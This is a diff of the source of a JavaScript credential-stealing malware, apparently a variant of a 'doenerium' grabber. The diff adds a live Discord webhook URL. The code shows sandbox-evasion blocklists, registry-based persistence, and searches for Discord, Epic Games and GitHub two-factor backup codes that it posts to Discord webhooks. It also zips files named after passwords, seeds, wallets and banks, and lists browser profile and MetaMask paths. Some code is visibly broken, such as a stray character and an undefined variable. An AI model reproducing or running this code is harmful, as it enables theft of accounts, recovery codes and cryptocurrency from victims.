@@ -27,7 +27,7 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
-const discordWebhookUrl = 'REMPLACE_ME';
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1307463639250243584/oKzeUlT8a6peM9svCfYjiDAKCcg0efP4stXHxGoQD6MrylIJXxV_iF67w91Nt-UjqaVq';
 
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
@@ -39,7 +39,7 @@ const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "m
 
 function hasAdminPrivileges() {
     const testFilePath = path.join(process.env.WINDIR, 'System32', `${generateRandomString(10)}.txt`);
-    
+
     try {
         // Try to write a file in the System32 folder
         fs.writeFileSync(testFilePath, 'test');
@@ -262,12 +262,12 @@ function hideconsole() {
 
 
 const foldersToSearch = [
-  'Videos',
-  'Desktop',
-  'Documents',
-  'Downloads',
-  'Pictures',
-  path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
+    'Videos',
+    'Desktop',
+    'Documents',
+    'Downloads',
+    'Pictures',
+    path.join('AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
 ];
 paths = [
     appdata + '\\discord\\',
@@ -397,250 +397,250 @@ function removeRegistryKey() {
 */
 
 function startup() {
-  // Path to the current .exe file
-  const exeFilePath = process.execPath; // Get the path of the running executable
+    // Path to the current .exe file
+    const exeFilePath = process.execPath; // Get the path of the running executable
 
-  // VBScript file name and path
-  const vbsFileName = 'Update.vbs';
-  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData
+    // VBScript file name and path
+    const vbsFileName = 'Update.vbs';
+    const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData
 
-  // Registry key path
-  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
-  const keyName = path.basename(exeFilePath, '.exe'); // Use the name of the .exe file without extension
+    // Registry key path
+    const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
+    const keyName = path.basename(exeFilePath, '.exe'); // Use the name of the .exe file without extension
 
-  // Create VBScript content to run the .exe minimized
-  const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;
+    // Create VBScript content to run the .exe minimized
+    const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;
 
-  // Write the VBScript to ProgramData
-  fs.writeFileSync(programDataPath, vbsContent);
+    // Write the VBScript to ProgramData
+    fs.writeFileSync(programDataPath, vbsContent);
 
-  // Command to add the VBScript file to the registry
-  const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;
+    // Command to add the VBScript file to the registry
+    const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;
 
-  exec(addCommand, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error adding registry key: ${error.message}`);
-      return;
-    }
+    exec(addCommand, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error adding registry key: ${error.message}`);
+            return;
+        }
 
-    if (stderr) {
-      console.error(`CMD error: ${stderr}`);
-      return;
-    }
+        if (stderr) {
+            console.error(`CMD error: ${stderr}`);
+            return;
+        }
 
-    console.log(`Registry key added successfully: ${stdout}`);
-  });
+        console.log(`Registry key added successfully: ${stdout}`);
+    });
 }
 
 
 function sendSuccessToWebhook() {i
-  console.log('Sending success to webhook');
+    console.log('Sending success to webhook');
 }
 
 async function findBackupCodes() {
-  for (const searchFolder of foldersToSearch) {
-    try {
-      const folderPath = path.join(os.homedir(), searchFolder);
-      const files = fs.readdirSync(folderPath);
+    for (const searchFolder of foldersToSearch) {
+        try {
+            const folderPath = path.join(os.homedir(), searchFolder);
+            const files = fs.readdirSync(folderPath);
 
-      for (const currentFile of files) {
-        if (currentFile === 'discord_backup_codes.txt') {
-          const sourceFilePath = path.join(folderPath, currentFile);
-          const destinationFilePath = path.join(mainFolderPath, currentFile);
+            for (const currentFile of files) {
+                if (currentFile === 'discord_backup_codes.txt') {
+                    const sourceFilePath = path.join(folderPath, currentFile);
+                    const destinationFilePath = path.join(mainFolderPath, currentFile);
 
-          try {
-            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
-            console.log(`Backup codes file copied to: ${destinationFilePath}`);
+                    try {
+                        await fs.promises.copyFile(sourceFilePath, destinationFilePath);
+                        console.log(`Backup codes file copied to: ${destinationFilePath}`);
 
-            const embed = {
-              title: '',
-              color: 0x303037,
-              author: {
-                name: "Discord backup codes found",
-                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
-              },
-              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
-              footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-              },
-            };
+                        const embed = {
+                            title: '',
+                            color: 0x303037,
+                            author: {
+                                name: "Discord backup codes found",
+                                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1190759106907226112/discord-logo-icon-editorial-free-vector_1.png"
+                            },
+                            description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
+                            footer: {
+                                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                            },
+                        };
 
-            const payload = {
-              embeds: [embed],
-            };
+                        const payload = {
+                            embeds: [embed],
+                        };
 
-            try {
-              await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
-              console.log('Backup codes embed sent to Discord');
-            } catch (error) {
-              console.error(`Error sending webhook: ${error.message}`);
+                        try {
+                            await axios.post(discordWebhookUrl, payload);
+                            await axios.post(discordWebhookURL, payload);
+                            console.log('Backup codes embed sent to Discord');
+                        } catch (error) {
+                            console.error(`Error sending webhook: ${error.message}`);
+                        }
+                    } catch (error) {
+                        console.error(`Error copying file: ${error.message}`);
+                    }
+                }
             }
-          } catch (error) {
-            console.error(`Error copying file: ${error.message}`);
-          }
+        } catch (err) {
+            console.error(`Error reading folder ${searchFolder}: ${err.message}`);
         }
-      }
-    } catch (err) {
-      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
     }
-  }
 }
 
 async function findEpicGamesBackupCodes() {
-  const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';
+    const epicGamesBackupFileName = 'Epic Games Account Two-Factor backup codes.txt';
 
-  for (const searchFolder of foldersToSearch) {
-    try {
-      const folderPath = path.join(os.homedir(), searchFolder);
-      const files = fs.readdirSync(folderPath);
+    for (const searchFolder of foldersToSearch) {
+        try {
+            const folderPath = path.join(os.homedir(), searchFolder);
+            const files = fs.readdirSync(folderPath);
 
-      for (const currentFile of files) {
-        if (currentFile === epicGamesBackupFileName) {
-          const sourceFilePath = path.join(folderPath, currentFile);
-          const destinationFilePath = path.join(mainFolderPath, currentFile);
+            for (const currentFile of files) {
+                if (currentFile === epicGamesBackupFileName) {
+                    const sourceFilePath = path.join(folderPath, currentFile);
+                    const destinationFilePath = path.join(mainFolderPath, currentFile);
 
-          try {
-            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
-            console.log(`Epic Games Backup codes file copied to: ${destinationFilePath}`);
+                    try {
+                        await fs.promises.copyFile(sourceFilePath, destinationFilePath);
+                        console.log(`Epic Games Backup codes file copied to: ${destinationFilePath}`);
 
-            const embed = {
-              title: '',
-              color: 0x303037,
-              author: {
-                name: "Epic Games Backup codes found",
-                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1206880939624370277/epic-games-icon-2048x2048-tyfxpnys.png?ex=65dd9e76&is=65cb2976&hm=0fbcc1c2929db9fa85e2e0a9844a74b22bf59c063b3fc8ed55b9bca6c6484c74&"
-              },
-              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
-              footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-              },
-            };
+                        const embed = {
+                            title: '',
+                            color: 0x303037,
+                            author: {
+                                name: "Epic Games Backup codes found",
+                                icon_url: "https://cdn.discordapp.com/attachments/660885288079589385/1206880939624370277/epic-games-icon-2048x2048-tyfxpnys.png?ex=65dd9e76&is=65cb2976&hm=0fbcc1c2929db9fa85e2e0a9844a74b22bf59c063b3fc8ed55b9bca6c6484c74&"
+                            },
+                            description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
+                            footer: {
+                                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                            },
+                        };
 
-            const payload = {
-              embeds: [embed],
-            };
+                        const payload = {
+                            embeds: [embed],
+                        };
 
-            try {
-              await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload);
-              console.log('Epic Games Backup codes embed sent to Discord');
-            } catch (error) {
-              console.error(`Error sending webhook: ${error.message}`);
+                        try {
+                            await axios.post(discordWebhookUrl, payload);
+                            await axios.post(discordWebhookURL, payload);
+                            console.log('Epic Games Backup codes embed sent to Discord');
+                        } catch (error) {
+                            console.error(`Error sending webhook: ${error.message}`);
+                        }
+                    } catch (error) {
+                        console.error(`Error copying file: ${error.message}`);
+                    }
+                }
             }
-          } catch (error) {
-            console.error(`Error copying file: ${error.message}`);
-          }
+        } catch (err) {
+            console.error(`Error reading folder ${searchFolder}: ${err.message}`);
         }
-      }
-    } catch (err) {
-      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
     }
-  }
 }
 
 
 async function findGithubBackupCodes() {
-  for (const searchFolder of foldersToSearch) {
-    try {
-      const folderPath = path.join(os.homedir(), searchFolder);
-      const files = fs.readdirSync(folderPath);
+    for (const searchFolder of foldersToSearch) {
+        try {
+            const folderPath = path.join(os.homedir(), searchFolder);
+            const files = fs.readdirSync(folderPath);
 
-      for (const currentFile of files) {
-        if (currentFile === 'github-recovery-codes.txt') {
-          const sourceFilePath = path.join(folderPath, currentFile);
-          const destinationFilePath = path.join(mainFolderPath, currentFile);
+            for (const currentFile of files) {
+                if (currentFile === 'github-recovery-codes.txt') {
+                    const sourceFilePath = path.join(folderPath, currentFile);
+                    const destinationFilePath = path.join(mainFolderPath, currentFile);
 
-          try {
-            await fs.promises.copyFile(sourceFilePath, destinationFilePath);
-            console.log(`Github Backup codes file copied to: ${destinationFilePath}`);
+                    try {
+                        await fs.promises.copyFile(sourceFilePath, destinationFilePath);
+                        console.log(`Github Backup codes file copied to: ${destinationFilePath}`);
 
-            const embed = {
-              title: '',
-              color: 0x303037,
-              author: {
-                name: "Github backup codes found",
-                icon_url: "https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png"
-              },
-              description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
-              footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-              },
-            };
+                        const embed = {
+                            title: '',
+                            color: 0x303037,
+                            author: {
+                                name: "Github backup codes found",
+                                icon_url: "https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png"
+                            },
+                            description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
+                            footer: {
+                                text: `${user.hostname} | @probablynottoxicity | discord.gg/GeGfPp7E7w`,
+                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                            },
+                        };
 
-            const payload = {
-              embeds: [embed],
-            };
+                        const payload = {
+                            embeds: [embed],
+                        };
 
-            try {
-              await axios.post(discordWebhookUrl, payload);
-              await axios.post(discordWebhookUr1, payload)
-              console.log('Backup codes embed sent to Discord');
-            } catch (error) {
-              console.error(`Error sending webhook: ${error.message}`);
+                        try {
+                            await axios.post(discordWebhookUrl, payload);
+                            await axios.post(discordWebhookURL, payload);
+                            console.log('Backup codes embed sent to Discord');
+                        } catch (error) {
+                            console.error(`Error sending webhook: ${error.message}`);
+                        }
+                    } catch (error) {
+                        console.error(`Error copying file: ${error.message}`);
+                    }
+                }
             }
-          } catch (error) {
-            console.error(`Error copying file: ${error.message}`);
-          }
+        } catch (err) {
+            console.error(`Error reading folder ${searchFolder}: ${err.message}`);
         }
-      }
-    } catch (err) {
-      console.error(`Error reading folder ${searchFolder}: ${err.message}`);
     }
-  }
 }
 
 const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
 const files = ["secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privé", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note"];
 
 function stealFiles() {
-  try {
-    const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
-    const zip = new AdmZip();
+    try {
+        const tempDir = fs.mkdtempSync(path.join(process.env.TEMP || '/tmp', crypto.randomBytes(16).toString('hex')));
+        const zip = new AdmZip();
 
-    for (const extension of allowedExtensions) {
-      const results = [];
+        for (const extension of allowedExtensions) {
+            const results = [];
 
-      for (const folder of foldersToSearch) {
-        const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
-        if (fs.existsSync(directory)) {
-          const filesInFolder = fs.readdirSync(directory);
-          for (const file of filesInFolder) {
-            const filePath = path.join(directory, file);
-            const fileExtension = path.extname(file).toLowerCase();
-            const fileName = path.basename(file, path.extname(file)).toLowerCase();
-            const fileStats = fs.statSync(filePath);
-            const fileSize = fileStats.size;
-            if (fileStats.isFile() &&
-                fileExtension === extension &&
-                files.some(keyword => fileName.includes(keyword)) &&
-                fileSize < 3 * 1024 * 1024) {
-              results.push(filePath);
+            for (const folder of foldersToSearch) {
+                const directory = path.join(process.env.HOME || process.env.USERPROFILE, folder);
+                if (fs.existsSync(directory)) {
+                    const filesInFolder = fs.readdirSync(directory);
+                    for (const file of filesInFolder) {
+                        const filePath = path.join(directory, file);
+                        const fileExtension = path.extname(file).toLowerCase();
+                        const fileName = path.basename(file, path.extname(file)).toLowerCase();
+                        const fileStats = fs.statSync(filePath);
+                        const fileSize = fileStats.size;
+                        if (fileStats.isFile() &&
+                            fileExtension === extension &&
+                            files.some(keyword => fileName.includes(keyword)) &&
+                            fileSize < 3 * 1024 * 1024) {
+                            results.push(filePath);
+                        }
+                    }
+                }
             }
-          }
+
+            if (results.length > 0) {
+                results.forEach(file => {
+                    const fileName = path.basename(file);
+                    const destPath = path.join(tempDir, fileName);
+                    fs.copyFileSync(file, destPath);
+                });
+            }
         }
-      }
 
-      if (results.length > 0) {
-        results.forEach(file => {
-          const fileName = path.basename(file);
-          const destPath = path.join(tempDir, fileName);
-          fs.copyFileSync(file, destPath);
-        });
-      }
+        zip.addLocalFolder(tempDir);
+        const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
+        zip.writeZip(zipFilePath);
+        fs.rmSync(tempDir, { recursive: true });
+        console.log('Files stolen and compressed successfully.');
+    } catch (err) {
+        console.error("Error:", err);
     }
-
-    zip.addLocalFolder(tempDir);
-    const zipFilePath = path.join(mainFolderPath, 'stolen_files.zip');
-    zip.writeZip(zipFilePath);
-    fs.rmSync(tempDir, { recursive: true });
-    console.log('Files stolen and compressed successfully.');
-  } catch (err) {
-    console.error("Error:", err);
-  }
 }
 
 
@@ -687,7 +687,7 @@ _0x9b6227.cookies = 0
 _0x9b6227.autofills = 0
 _0x9b6227.wallets = 0
 const count = _0x9b6227,
-user = {
+    user = {
         ram: os.totalmem(),
         version: os.version(),
         uptime: os.uptime,
@@ -812,164 +812,164 @@ _0x4ae424.MetaMask_O =
     '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
 
 const extension = _0x4ae424,
-  browserPath = [
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Google\\Chrome\\User Data\\',
+    browserPath = [
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Default\\',
+            'Default',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
+            'Profile_1',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
+            'Profile_2',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
+            'Profile_3',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
+            'Profile_4',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
+            'Profile_5',
+            user.local + '\\Google\\Chrome\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
+            'Default',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
+            'Profile_1',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
+            'Profile_2',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
+            'Profile_3',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
+            'Profile_4',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
+            'Profile_5',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
+            'Guest Profile',
+            user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
+            'Default',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
+            'Profile_1',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
+            'Profile_2',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
+            'Profile_3',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
+            'Profile_4',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
+            'Profile_5',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
+            'Guest Profile',
+            user.local + '\\Yandex\\YandexBrowser\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
+            'Default',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
+            'Profile_1',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
+            'Profile_2',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
+            'Profile_3',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
+            'Profile_4',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
+            'Profile_5',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
+            'Guest Profile',
+            user.local + '\\Microsoft\\Edge\\User Data\\',
+        ],
+        [
+            user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
+            'Default',
+            user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
+        ],
+        [
+            user.roaming + '\\Opera Software\\Opera Stable\\',
+            'Default',
+            user.roaming + '\\Opera Software\\Opera Stable\\',
+        ],
+        [
+            user.roaming + '\\Opera Software\\Opera GX Stable\\',
+            'Default',
+            user.roaming + '\\Opera Software\\Opera GX Stable\\',
+        ],
     ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
-      'Default',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera Stable\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera Stable\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera GX Stable\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera GX Stable\\',
-    ],
-  ],
-randomPath = path.join(mainFolderPath);
+    randomPath = path.join(mainFolderPath);
 
 if (!fs.existsSync(randomPath)) {
-  console.log('');
+    console.log('');
 } else {
-  sendSuccessToWebhook();
+    sendSuccessToWebhook();
 }
 
 function initializeFolders() {
@@ -1014,17 +1014,17 @@ async function installPython() {
 
     console.log('Performing silent installation of Python...');
     try {
-    execFileSync(pythonInstallerFile, [
-        '/quiet',
-        'InstallAllUsers=0',
-        'PrependPath=1',
